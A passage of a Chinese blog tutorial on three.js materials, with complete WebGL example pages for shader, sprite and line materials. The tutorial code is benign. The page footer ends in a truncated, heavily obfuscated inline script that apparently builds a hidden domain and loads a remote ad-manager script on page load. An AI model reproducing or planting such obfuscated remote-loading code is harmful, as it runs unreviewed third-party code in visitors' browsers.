				const vertexCount = 200 * 3;

				const geometry = new THREE.BufferGeometry();

				const positions = [];
				const colors = [];

				for ( let i = 0; i &lt; vertexCount; i ++ ) {

					// adding x,y,z
					positions.push( Math.random() - 0.5 );
					positions.push( Math.random() - 0.5 );
					positions.push( Math.random() - 0.5 );

					// adding r,g,b,a
					colors.push( Math.random() * 255 );
					colors.push( Math.random() * 255 );
					colors.push( Math.random() * 255 );
					colors.push( Math.random() * 255 );

				}

				const positionAttribute = new THREE.Float32BufferAttribute( positions, 3 );
				const colorAttribute = new THREE.Uint8BufferAttribute( colors, 4 );

				colorAttribute.normalized = true; // this will map the buffer values to 0.0f - +1.0f in the shader

				geometry.setAttribute( 'position', positionAttribute );
				geometry.setAttribute( 'color', colorAttribute );

				// material

				const material = new THREE.RawShaderMaterial( {

					uniforms: {
						time: { value: 1.0 }
					},
					vertexShader: document.getElementById( 'vertexShader' ).textContent,
					fragmentShader: document.getElementById( 'fragmentShader' ).textContent,
					side: THREE.DoubleSide,
					transparent: true

				} );

				const mesh = new THREE.Mesh( geometry, material );
				scene.add( mesh );

				renderer = new THREE.WebGLRenderer();
				renderer.setPixelRatio( window.devicePixelRatio );
				renderer.setSize( window.innerWidth, window.innerHeight );
				container.appendChild( renderer.domElement );

				stats = new Stats();
				container.appendChild( stats.dom );

				window.addEventListener( 'resize', onWindowResize );

			}

			function onWindowResize() {

				camera.aspect = window.innerWidth / window.innerHeight;
				camera.updateProjectionMatrix();

				renderer.setSize( window.innerWidth, window.innerHeight );

			}

			//

			function animate() {

				requestAnimationFrame( animate );

				render();
				stats.update();

			}

			function render() {

				const time = performance.now();

				const object = scene.children[ 0 ];

				object.rotation.y = time * 0.0005;
				object.material.uniforms.time.value = time * 0.005;

				renderer.render( scene, camera );

			}

		&lt;/script&gt;

	&lt;/body&gt;
&lt;/html&gt;
</code></pre> 
<p></p> 
<h4 id="13%E3%80%81ShaderMaterial%20%E7%9D%80%E8%89%B2%E5%99%A8%E6%9D%90%E8%B4%A8">13、ShaderMaterial 着色器材质</h4> 
<p>使用自定义shader渲染的材质。 shader是一个用<a href="https://www.khronos.org/files/opengles_shading_language.pdf" rel="nofollow" title="GLSL">GLSL</a>编写的小程序 ，在GPU上运行。 您可能需要使用自定义shader，如果你要：</p> 
<ul><li>要实现内置 materials 之外的效果。</li><li>将许多对象组合成单个BufferGeometry以提高性能。</li></ul> 
<p>使用<strong>ShaderMaterial</strong>时需要注意以下注意事项：</p> 
<ul><li><strong>ShaderMaterial</strong> 只有使用 WebGLRenderer 才可以绘制正常， 因为 <a href="https://en.wikipedia.org/wiki/Shader#Vertex_shaders" rel="nofollow" title="vertexShader">vertexShader</a> 和 <a href="https://en.wikipedia.org/wiki/Shader#Pixel_shaders" rel="nofollow" title="fragmentShader">fragmentShader</a> 属性中GLSL代码必须使用WebGL来编译并运行在GPU中。</li><li>从 THREE r72开始，不再支持在ShaderMaterial中直接分配属性。 必须使用 BufferGeometry实例，使用BufferAttribute实例来定义自定义属性。</li><li>从 THREE r77开始，WebGLRenderTarget 或 WebGLCubeRenderTarget 实例不再被用作uniforms。 必须使用它们的texture 属性。</li><li>内置attributes和uniforms与代码一起传递到shaders。 如果您不希望WebGLProgram向shader代码添加任何内容，则可以使用RawShaderMaterial而不是此类。</li><li>您可以使用指令#pragma unroll_loop_start，#pragma unroll_loop_end 以便通过shader预处理器在GLSL中展开for循环。 该指令必须放在循环的正上方。循环格式必须与定义的标准相对应。 
  <ul><li>循环必须标准化<a href="https://en.wikipedia.org/wiki/Normalized_loop" rel="nofollow" title="normalized">normalized</a>。</li><li>循环变量必须是<strong>i</strong>。</li><li>The value <strong>UNROLLED_LOOP_INDEX</strong> will be replaced with the explicity value of <strong>i</strong> for the given iteration and can be used in preprocessor statements.</li></ul></li></ul> 
<p> <img alt="" height="709" src="https://images2.imgbox.com/dc/7b/WwtPx6ty_o.png" width="741"></p> 
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
	&lt;head&gt;
	&lt;title&gt;three.js webgl - buffergeometry - selective - draw&lt;/title&gt;
	&lt;meta charset="utf-8"&gt;
	&lt;meta name="viewport" content="width=device-width, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0"&gt;
	&lt;link type="text/css" rel="stylesheet" href="main.css"&gt;

	&lt;script type="x-shader/x-vertex" id="vertexshader"&gt;
		attribute float visible;
		varying float vVisible;
		attribute vec3 vertColor;
		varying vec3 vColor;

		void main() {

			vColor = vertColor;
			vVisible = visible;
			gl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );

		}
	&lt;/script&gt;
	&lt;script type="x-shader/x-fragment" id="fragmentshader"&gt;
		varying float vVisible;
		varying vec3 vColor;

		void main() {

			if ( vVisible &gt; 0.0 ) {

				gl_FragColor = vec4( vColor, 1.0 );

			} else {

				discard;

			}

		}
	&lt;/script&gt;
	&lt;/head&gt;
	&lt;body&gt;
		&lt;div id="info"&gt;
			&lt;a href="https://threejs.org" target="_blank" rel="noopener"&gt;three.js&lt;/a&gt; buffergeometry - selective - draw
			&lt;div id="title"&gt;&lt;/div&gt;
			&lt;div id="ui"&gt;&lt;a href="#" id="hideLines"&gt;CULL SOME LINES&lt;/a&gt; - &lt;a href="#" id="showAllLines"&gt;SHOW ALL LINES&lt;/a&gt;&lt;/div&gt;
		&lt;/div&gt;

		&lt;!-- Import maps polyfill --&gt;
		&lt;!-- Remove this when import maps will be widely supported --&gt;
		&lt;script async src="https://unpkg.com/es-module-shims@1.3.6/dist/es-module-shims.js"&gt;&lt;/script&gt;

		&lt;script type="importmap"&gt;
			{
				"imports": {
					"three": "../build/three.module.js"
				}
			}
		&lt;/script&gt;

		&lt;script type="module"&gt;

			import * as THREE from 'three';

			import Stats from './jsm/libs/stats.module.js';

			let camera, scene, renderer, stats;
			let geometry, mesh;
			const numLat = 100;
			const numLng = 200;
			let numLinesCulled = 0;

			init();
			animate();

			function init() {

				renderer = new THREE.WebGLRenderer( { antialias: true } );
				renderer.setPixelRatio( window.devicePixelRatio );
				renderer.setSize( window.innerWidth, window.innerHeight );
				document.body.appendChild( renderer.domElement );

				scene = new THREE.Scene();

				camera = new THREE.PerspectiveCamera( 45, window.innerWidth / window.innerHeight, 0.01, 10 );
				camera.position.z = 3.5;

				scene.add( new THREE.AmbientLight( 0x444444 ) );

				stats = new Stats();
				document.body.appendChild( stats.dom );

				window.addEventListener( 'resize', onWindowResize );

				addLines( 1.0 );

				const hideLinesButton = document.getElementById( 'hideLines' );
				hideLinesButton.addEventListener( 'click', hideLines );

				const showAllLinesButton = document.getElementById( 'showAllLines' );
				showAllLinesButton.addEventListener( 'click', showAllLines );

			}

			function addLines( radius ) {

				geometry = new THREE.BufferGeometry();
				const linePositions = new Float32Array( numLat * numLng * 3 * 2 );
				const lineColors = new Float32Array( numLat * numLng * 3 * 2 );
				const visible = new Float32Array( numLat * numLng * 2 );

				for ( let i = 0; i &lt; numLat; ++ i ) {

					for ( let j = 0; j &lt; numLng; ++ j ) {

						const lat = ( Math.random() * Math.PI ) / 50.0 + i / numLat * Math.PI;
						const lng = ( Math.random() * Math.PI ) / 50.0 + j / numLng * 2 * Math.PI;

						const index = i * numLng + j;

						linePositions[ index * 6 + 0 ] = 0;
						linePositions[ index * 6 + 1 ] = 0;
						linePositions[ index * 6 + 2 ] = 0;
						linePositions[ index * 6 + 3 ] = radius * Math.sin( lat ) * Math.cos( lng );
						linePositions[ index * 6 + 4 ] = radius * Math.cos( lat );
						linePositions[ index * 6 + 5 ] = radius * Math.sin( lat ) * Math.sin( lng );

						const color = new THREE.Color( 0xffffff );

						color.setHSL( lat / Math.PI, 1.0, 0.2 );
						lineColors[ index * 6 + 0 ] = color.r;
						lineColors[ index * 6 + 1 ] = color.g;
						lineColors[ index * 6 + 2 ] = color.b;

						color.setHSL( lat / Math.PI, 1.0, 0.7 );
						lineColors[ index * 6 + 3 ] = color.r;
						lineColors[ index * 6 + 4 ] = color.g;
						lineColors[ index * 6 + 5 ] = color.b;

						// non-0 is visible
						visible[ index * 2 + 0 ] = 1.0;
						visible[ index * 2 + 1 ] = 1.0;

					}

				}

				geometry.setAttribute( 'position', new THREE.BufferAttribute( linePositions, 3 ) );
				geometry.setAttribute( 'vertColor', new THREE.BufferAttribute( lineColors, 3 ) );
				geometry.setAttribute( 'visible', new THREE.BufferAttribute( visible, 1 ) );

				geometry.computeBoundingSphere();

				const shaderMaterial = new THREE.ShaderMaterial( {

					vertexShader: document.getElementById( 'vertexshader' ).textContent,
					fragmentShader: document.getElementById( 'fragmentshader' ).textContent
				} );

				mesh = new THREE.LineSegments( geometry, shaderMaterial );
				scene.add( mesh );

				updateCount();

			}

			function updateCount() {

				const str = '1 draw call, ' + numLat * numLng + ' lines, ' + numLinesCulled + ' culled (&lt;a target="_blank" href="http://callum.com"&gt;author&lt;/a&gt;)';
				document.getElementById( 'title' ).innerHTML = str.replace( /\B(?=(\d{3})+(?!\d))/g, ',' );

			}

			function hideLines() {

				for ( let i = 0; i &lt; geometry.attributes.visible.array.length; i += 2 ) {

					if ( Math.random() &gt; 0.75 ) {

						if ( geometry.attributes.visible.array[ i + 0 ] ) {

							++ numLinesCulled;

						}

						geometry.attributes.visible.array[ i + 0 ] = 0;
						geometry.attributes.visible.array[ i + 1 ] = 0;

					}

				}

				geometry.attributes.visible.needsUpdate = true;

				updateCount();

			}

			function showAllLines() {

				numLinesCulled = 0;

				for ( let i = 0; i &lt; geometry.attributes.visible.array.length; i += 2 ) {

					geometry.attributes.visible.array[ i + 0 ] = 1;
					geometry.attributes.visible.array[ i + 1 ] = 1;

				}

				geometry.attributes.visible.needsUpdate = true;

				updateCount();

			}

			function onWindowResize() {

				camera.aspect = window.innerWidth / window.innerHeight;
				camera.updateProjectionMatrix();

				renderer.setSize( window.innerWidth, window.innerHeight );

			}

			function animate() {

				requestAnimationFrame( animate );

				const time = Date.now() * 0.001;

				mesh.rotation.x = time * 0.25;
				mesh.rotation.y = time * 0.5;

				stats.update();
				renderer.render( scene, camera );

			}

		&lt;/script&gt;
	&lt;/body&gt;
&lt;/html&gt;
</code></pre> 
<p></p> 
<h4 id="14%E3%80%81ShadowMaterial%20%E9%98%B4%E5%BD%B1%E6%9D%90%E8%B4%A8">14、ShadowMaterial 阴影材质</h4> 
<p>此材质可以接收阴影，但在其他方面完全透明。</p> 
<p><img alt="" height="373" src="https://images2.imgbox.com/5b/5d/SqH25VCY_o.png" width="662"></p> 
<p> </p> 
<p></p> 
<h4 id="15%E3%80%81SpriteMaterial%20%E7%82%B9%E7%B2%BE%E7%81%B5%E6%9D%90%E8%B4%A8">15、SpriteMaterial 点精灵材质</h4> 
<p>一种使用Sprite的材质。</p> 
<p><img alt="" height="711" src="https://images2.imgbox.com/32/a1/ENSFwIiu_o.png" width="843"></p> 
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
	&lt;head&gt;
		&lt;title&gt;three.js webgl - sprites&lt;/title&gt;
		&lt;meta charset="utf-8"&gt;
		&lt;meta name="viewport" content="width=device-width, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0"&gt;
		&lt;link type="text/css" rel="stylesheet" href="main.css"&gt;
	&lt;/head&gt;

	&lt;body&gt;
		&lt;div id="info"&gt;
			&lt;a href="https://threejs.org" target="_blank" rel="noopener"&gt;three.js&lt;/a&gt; - sprites
		&lt;/div&gt;

		&lt;!-- Import maps polyfill --&gt;
		&lt;!-- Remove this when import maps will be widely supported --&gt;
		&lt;script async src="https://unpkg.com/es-module-shims@1.3.6/dist/es-module-shims.js"&gt;&lt;/script&gt;

		&lt;script type="importmap"&gt;
			{
				"imports": {
					"three": "../build/three.module.js"
				}
			}
		&lt;/script&gt;

		&lt;script type="module"&gt;

			import * as THREE from 'three';

			let camera, scene, renderer;
			let cameraOrtho, sceneOrtho;

			let spriteTL, spriteTR, spriteBL, spriteBR, spriteC;

			let mapC;

			let group;

			init();
			animate();

			function init() {

				const width = window.innerWidth;
				const height = window.innerHeight;

				camera = new THREE.PerspectiveCamera( 60, width / height, 1, 2100 );
				camera.position.z = 1500;

				cameraOrtho = new THREE.OrthographicCamera( - width / 2, width / 2, height / 2, - height / 2, 1, 10 );
				cameraOrtho.position.z = 10;

				scene = new THREE.Scene();
				scene.fog = new THREE.Fog( 0x000000, 1500, 2100 );

				sceneOrtho = new THREE.Scene();

				// create sprites

				const amount = 200;
				const radius = 500;

				const textureLoader = new THREE.TextureLoader();

				textureLoader.load( 'textures/sprite0.png', createHUDSprites );
				const mapB = textureLoader.load( 'textures/sprite1.png' );
				mapC = textureLoader.load( 'textures/sprite2.png' );

				group = new THREE.Group();

				const materialC = new THREE.SpriteMaterial( { map: mapC, color: 0xffffff, fog: true } );
				const materialB = new THREE.SpriteMaterial( { map: mapB, color: 0xffffff, fog: true } );

				for ( let a = 0; a &lt; amount; a ++ ) {

					const x = Math.random() - 0.5;
					const y = Math.random() - 0.5;
					const z = Math.random() - 0.5;

					let material;

					if ( z &lt; 0 ) {

						material = materialB.clone();

					} else {

						material = materialC.clone();
						material.color.setHSL( 0.5 * Math.random(), 0.75, 0.5 );
						material.map.offset.set( - 0.5, - 0.5 );
						material.map.repeat.set( 2, 2 );

					}

					const sprite = new THREE.Sprite( material );

					sprite.position.set( x, y, z );
					sprite.position.normalize();
					sprite.position.multiplyScalar( radius );

					group.add( sprite );

				}

				scene.add( group );

				// renderer

				renderer = new THREE.WebGLRenderer();
				renderer.setPixelRatio( window.devicePixelRatio );
				renderer.setSize( window.innerWidth, window.innerHeight );
				renderer.autoClear = false; // To allow render overlay on top of sprited sphere

				document.body.appendChild( renderer.domElement );

				//

				window.addEventListener( 'resize', onWindowResize );

			}

			function createHUDSprites( texture ) {

				const material = new THREE.SpriteMaterial( { map: texture } );

				const width = material.map.image.width;
				const height = material.map.image.height;

				spriteTL = new THREE.Sprite( material );
				spriteTL.center.set( 0.0, 1.0 );
				spriteTL.scale.set( width, height, 1 );
				sceneOrtho.add( spriteTL );

				spriteTR = new THREE.Sprite( material );
				spriteTR.center.set( 1.0, 1.0 );
				spriteTR.scale.set( width, height, 1 );
				sceneOrtho.add( spriteTR );

				spriteBL = new THREE.Sprite( material );
				spriteBL.center.set( 0.0, 0.0 );
				spriteBL.scale.set( width, height, 1 );
				sceneOrtho.add( spriteBL );

				spriteBR = new THREE.Sprite( material );
				spriteBR.center.set( 1.0, 0.0 );
				spriteBR.scale.set( width, height, 1 );
				sceneOrtho.add( spriteBR );

				spriteC = new THREE.Sprite( material );
				spriteC.center.set( 0.5, 0.5 );
				spriteC.scale.set( width, height, 1 );
				sceneOrtho.add( spriteC );

				updateHUDSprites();

			}

			function updateHUDSprites() {

				const width = window.innerWidth / 2;
				const height = window.innerHeight / 2;

				spriteTL.position.set( - width, height, 1 ); // top left
				spriteTR.position.set( width, height, 1 ); // top right
				spriteBL.position.set( - width, - height, 1 ); // bottom left
				spriteBR.position.set( width, - height, 1 ); // bottom right
				spriteC.position.set( 0, 0, 1 ); // center

			}

			function onWindowResize() {

				const width = window.innerWidth;
				const height = window.innerHeight;

				camera.aspect = width / height;
				camera.updateProjectionMatrix();

				cameraOrtho.left = - width / 2;
				cameraOrtho.right = width / 2;
				cameraOrtho.top = height / 2;
				cameraOrtho.bottom = - height / 2;
				cameraOrtho.updateProjectionMatrix();

				updateHUDSprites();

				renderer.setSize( window.innerWidth, window.innerHeight );

			}

			function animate() {

				requestAnimationFrame( animate );
				render();

			}

			function render() {

				const time = Date.now() / 1000;

				for ( let i = 0, l = group.children.length; i &lt; l; i ++ ) {

					const sprite = group.children[ i ];
					const material = sprite.material;
					const scale = Math.sin( time + sprite.position.x * 0.01 ) * 0.3 + 1.0;

					let imageWidth = 1;
					let imageHeight = 1;

					if ( material.map &amp;&amp; material.map.image &amp;&amp; material.map.image.width ) {

						imageWidth = material.map.image.width;
						imageHeight = material.map.image.height;

					}

					sprite.material.rotation += 0.1 * ( i / l );
					sprite.scale.set( scale * imageWidth, scale * imageHeight, 1.0 );

					if ( material.map !== mapC ) {

						material.opacity = Math.sin( time + sprite.position.x * 0.01 ) * 0.4 + 0.6;

					}

				}

				group.rotation.x = time * 0.5;
				group.rotation.y = time * 0.75;
				group.rotation.z = time * 1.0;

				renderer.clear();
				renderer.render( scene, camera );
				renderer.clearDepth();
				renderer.render( sceneOrtho, cameraOrtho );

			}

		&lt;/script&gt;
	&lt;/body&gt;
&lt;/html&gt;
</code></pre> 
<p></p> 
<h4 id="16%E3%80%81LineBasicMaterial%20%E5%9F%BA%E7%A1%80%E7%BA%BF%E6%9D%A1%E6%9D%90%E8%B4%A8">16、LineBasicMaterial 基础线条材质</h4> 
<p>一种用于绘制线框样式几何体的材质。</p> 
<p><img alt="" height="718" src="https://images2.imgbox.com/25/30/syoQ5lLM_o.png" width="753"></p> 
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
	&lt;head&gt;
		&lt;title&gt;three.js webgl - buffergeometry - lines&lt;/title&gt;
		&lt;meta charset="utf-8"&gt;
		&lt;meta name="viewport" content="width=device-width, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0"&gt;
		&lt;link type="text/css" rel="stylesheet" href="main.css"&gt;
	&lt;/head&gt;
	&lt;body&gt;

		&lt;div id="container"&gt;&lt;/div&gt;
		&lt;div id="info"&gt;&lt;a href="https://threejs.org" target="_blank" rel="noopener"&gt;three.js&lt;/a&gt; webgl - buffergeometry - lines&lt;/div&gt;

		&lt;!-- Import maps polyfill --&gt;
		&lt;!-- Remove this when import maps will be widely supported --&gt;
		&lt;script async src="https://unpkg.com/es-module-shims@1.3.6/dist/es-module-shims.js"&gt;&lt;/script&gt;

		&lt;script type="importmap"&gt;
			{
				"imports": {
					"three": "../build/three.module.js"
				}
			}
		&lt;/script&gt;

		&lt;script type="module"&gt;

			import * as THREE from 'three';

			import Stats from './jsm/libs/stats.module.js';

			let container, stats, clock;

			let camera, scene, renderer;

			let line;

			const segments = 10000;
			const r = 800;
			let t = 0;

			init();
			animate();

			function init() {

				container = document.getElementById( 'container' );

				//

				camera = new THREE.PerspectiveCamera( 27, window.innerWidth / window.innerHeight, 1, 4000 );
				camera.position.z = 2750;

				scene = new THREE.Scene();

				clock = new THREE.Clock();

				const geometry = new THREE.BufferGeometry();
				const material = new THREE.LineBasicMaterial( { vertexColors: true } );

				const positions = [];
				const colors = [];

				for ( let i = 0; i &lt; segments; i ++ ) {

					const x = Math.random() * r - r / 2;
					const y = Math.random() * r - r / 2;
					const z = Math.random() * r - r / 2;

					// positions

					positions.push( x, y, z );

					// colors

					colors.push( ( x / r ) + 0.5 );
					colors.push( ( y / r ) + 0.5 );
					colors.push( ( z / r ) + 0.5 );

				}

				geometry.setAttribute( 'position', new THREE.Float32BufferAttribute( positions, 3 ) );
				geometry.setAttribute( 'color', new THREE.Float32BufferAttribute( colors, 3 ) );
				generateMorphTargets( geometry );

				geometry.computeBoundingSphere();

				line = new THREE.Line( geometry, material );
				scene.add( line );

				//

				renderer = new THREE.WebGLRenderer();
				renderer.setPixelRatio( window.devicePixelRatio );
				renderer.setSize( window.innerWidth, window.innerHeight );
				renderer.outputEncoding = THREE.sRGBEncoding;

				container.appendChild( renderer.domElement );

				//

				stats = new Stats();
				container.appendChild( stats.dom );

				//

				window.addEventListener( 'resize', onWindowResize );

			}

			function onWindowResize() {

				camera.aspect = window.innerWidth / window.innerHeight;
				camera.updateProjectionMatrix();

				renderer.setSize( window.innerWidth, window.innerHeight );

			}

			//

			function animate() {

				requestAnimationFrame( animate );

				render();
				stats.update();

			}

			function render() {

				const delta = clock.getDelta();
				const time = clock.getElapsedTime();

				line.rotation.x = time * 0.25;
				line.rotation.y = time * 0.5;

				t += delta * 0.5;
				line.morphTargetInfluences[ 0 ] = Math.abs( Math.sin( t ) );

				renderer.render( scene, camera );

			}

			function generateMorphTargets( geometry ) {

				const data = [];

				for ( let i = 0; i &lt; segments; i ++ ) {

					const x = Math.random() * r - r / 2;
					const y = Math.random() * r - r / 2;
					const z = Math.random() * r - r / 2;

					data.push( x, y, z );

				}

				const morphTarget = new THREE.Float32BufferAttribute( data, 3 );
				morphTarget.name = 'target1';

				geometry.morphAttributes.position = [ morphTarget ];

			}

		&lt;/script&gt;

	&lt;/body&gt;
&lt;/html&gt;
</code></pre> 
<p></p> 
<h4 id="17%E3%80%81LineDashedMaterial%20%E8%99%9A%E7%BA%BF%E6%9D%90%E8%B4%A8">17、LineDashedMaterial 虚线材质</h4> 
<p>一种用于绘制虚线样式几何体的材质。</p> 
<p><img alt="" height="568" src="https://images2.imgbox.com/d8/6e/9pJvor1C_o.png" width="588"></p> 
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
	&lt;head&gt;
		&lt;title&gt;three.js webgl - dashed lines&lt;/title&gt;
		&lt;meta charset="utf-8"&gt;
		&lt;meta name="viewport" content="width=device-width, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0"&gt;
		&lt;link type="text/css" rel="stylesheet" href="main.css"&gt;
	&lt;/head&gt;

	&lt;body&gt;
		&lt;div id="info"&gt;&lt;a href="https://threejs.org" target="_blank" rel="noopener"&gt;three.js&lt;/a&gt; - dashed lines example&lt;/div&gt;
		&lt;div id="container"&gt;&lt;/div&gt;

		&lt;!-- Import maps polyfill --&gt;
		&lt;!-- Remove this when import maps will be widely supported --&gt;
		&lt;script async src="https://unpkg.com/es-module-shims@1.3.6/dist/es-module-shims.js"&gt;&lt;/script&gt;

		&lt;script type="importmap"&gt;
			{
				"imports": {
					"three": "../build/three.module.js"
				}
			}
		&lt;/script&gt;

		&lt;script type="module"&gt;

			import * as THREE from 'three';

			import Stats from './jsm/libs/stats.module.js';

			import * as GeometryUtils from './jsm/utils/GeometryUtils.js';

			let renderer, scene, camera, stats;
			const objects = [];

			const WIDTH = window.innerWidth, HEIGHT = window.innerHeight;

			init();
			animate();

			function init() {

				camera = new THREE.PerspectiveCamera( 60, WIDTH / HEIGHT, 1, 200 );
				camera.position.z = 150;

				scene = new THREE.Scene();
				scene.background = new THREE.Color( 0x111111 );
				scene.fog = new THREE.Fog( 0x111111, 150, 200 );

				const subdivisions = 6;
				const recursion = 1;

				const points = GeometryUtils.hilbert3D( new THREE.Vector3( 0, 0, 0 ), 25.0, recursion, 0, 1, 2, 3, 4, 5, 6, 7 );
				const spline = new THREE.CatmullRomCurve3( points );

				const samples = spline.getPoints( points.length * subdivisions );
				const geometrySpline = new THREE.BufferGeometry().setFromPoints( samples );

				const line = new THREE.Line( geometrySpline, new THREE.LineDashedMaterial( { color: 0xffffff, dashSize: 1, gapSize: 0.5 } ) );
				line.computeLineDistances();

				objects.push( line );
				scene.add( line );

				const geometryBox = box( 50, 50, 50 );

				const lineSegments = new THREE.LineSegments( geometryBox, new THREE.LineDashedMaterial( { color: 0xffaa00, dashSize: 3, gapSize: 1 } ) );
				lineSegments.computeLineDistances();

				objects.push( lineSegments );
				scene.add( lineSegments );

				renderer = new THREE.WebGLRenderer( { antialias: true } );
				renderer.setPixelRatio( window.devicePixelRatio );
				renderer.setSize( WIDTH, HEIGHT );

				const container = document.getElementById( 'container' );
				container.appendChild( renderer.domElement );

				stats = new Stats();
				container.appendChild( stats.dom );

				//

				window.addEventListener( 'resize', onWindowResize );

			}

			function box( width, height, depth ) {

				width = width * 0.5,
				height = height * 0.5,
				depth = depth * 0.5;

				const geometry = new THREE.BufferGeometry();
				const position = [];

				position.push(
					- width, - height, - depth,
					- width, height, - depth,

					- width, height, - depth,
					width, height, - depth,

					width, height, - depth,
					width, - height, - depth,

					width, - height, - depth,
					- width, - height, - depth,

					- width, - height, depth,
					- width, height, depth,

					- width, height, depth,
					width, height, depth,

					width, height, depth,
					width, - height, depth,

					width, - height, depth,
					- width, - height, depth,

					- width, - height, - depth,
					- width, - height, depth,

					- width, height, - depth,
					- width, height, depth,

					width, height, - depth,
					width, height, depth,

					width, - height, - depth,
					width, - height, depth
				 );

				geometry.setAttribute( 'position', new THREE.Float32BufferAttribute( position, 3 ) );

				return geometry;

			}

			function onWindowResize() {

				camera.aspect = window.innerWidth / window.innerHeight;
				camera.updateProjectionMatrix();

				renderer.setSize( window.innerWidth, window.innerHeight );

			}

			function animate() {

				requestAnimationFrame( animate );

				render();
				stats.update();

			}

			function render() {

				const time = Date.now() * 0.001;

				scene.traverse( function ( object ) {

					if ( object.isLine ) {

						object.rotation.x = 0.25 * time;
						object.rotation.y = 0.25 * time;

					}

				} );

				renderer.render( scene, camera );

			}

	&lt;/script&gt;

&lt;/body&gt;

&lt;/html&gt;
</code></pre> 
<p></p> 
<p></p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/35d22caeda76b6835715619234be920a/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">【论文笔记】MV3D：Multi-View 3D Object Detection Network for Autonomous Driving</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/6e1d6495b9d27455b29520c886a1860a/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">记openssh升级，telnet安装（环境CentOS 7.9。 晗旧版本的不同补充）</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程爱好者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151260"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var 